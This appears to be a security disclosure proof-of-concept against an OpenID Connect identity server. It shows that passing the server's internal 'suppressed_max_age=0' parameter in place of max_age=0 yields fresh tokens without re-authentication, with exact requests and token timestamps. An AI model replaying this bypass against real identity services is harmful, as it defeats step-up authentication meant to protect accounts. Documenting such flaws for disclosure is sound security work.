=============================================================================
STEP 1: Confirm normal max_age=0 behavior (login redirect expected)
=============================================================================

REQUEST:
GET /connect/authorize?client_id=visma.online.administration
  &redirect_uri=https%3A%2F%2Fadmin.stage.vismaonline.com
  &response_type=id_token%20token
  &scope=openid%20profile
  &state=S1
  &response_mode=form_post
  &nonce=N1
  &max_age=0
Host: identity.stage.vismaonline.com

RESPONSE (302 Found):
Location: https://identity.stage.vismaonline.com/login?ReturnUrl=%2Fconnect%2Fauthorize%3F
  ...max_age%3D0%26suppressed_max_age%3D0...

OBSERVATION:
Server redirects to login page (correct — max_age=0 forces re-auth).
BUT the redirect URL contains a non-standard parameter: suppressed_max_age=0
This parameter is injected by the server's own pipeline when processing max_age=0.

=============================================================================
STEP 2: Bypass — send suppressed_max_age=0 directly (WITHOUT max_age)
=============================================================================

REQUEST:
GET /connect/authorize?client_id=visma.online.administration
  &redirect_uri=https%3A%2F%2Fadmin.stage.vismaonline.com
  &response_type=id_token%20token
  &scope=openid%20profile
  &state=S1
  &response_mode=form_post
  &nonce=N2
  &suppressed_max_age=0
Host: identity.stage.vismaonline.com
Cookie: [authenticated session cookies — same session, NO re-authentication performed]

RESPONSE (200 OK with auto-submitting form):
<form method='post' action='https://admin.stage.vismaonline.com'>
  <input name='id_token' value='eyJhbGciOiJSUzI1NiIsImtpZC...' />
  <input name='access_token' value='eyJhbGciOiJSUzI1NiIsImtpZC...' />
  <input name='expires_in' value='300' />
  ...
</form>

OBSERVATION:
Server issues a FRESH TOKEN without requiring re-authentication.
max_age=0 should require auth_time == now (within seconds).
This token has auth_time 2275 seconds BEFORE token issuance.

  "exp": 1781082806,

  "sub": "58679ba6-9bd7-4c6e-80fb-ff3d86396652",
  "auth_time": 1781044531,   <-- USER'S LAST ACTUAL LOGIN
  "amr": ["external"],
  "idp": "VismaConnect",
  "sid": "29db947e-a7d0-4dcf-b42d-fd3a8ff94927"
}

MATH:
  iat        = 1781046806  (token issued at)
  auth_time  = 1781044531  (user last authenticated at)
  difference = 2275 seconds = 37.9 minutes

max_age=0 requires: (iat - auth_time) <= 0 seconds (re-auth NOW)
actual:             (iat - auth_time) = 2275 seconds (38 minutes stale)

VERDICT: max_age=0 enforcement completely bypassed.
A relying party sending max_age=0 to force step-up re-authentication will
receive a token with an auth_time that is 38 minutes stale — the user
was NOT re-authenticated.
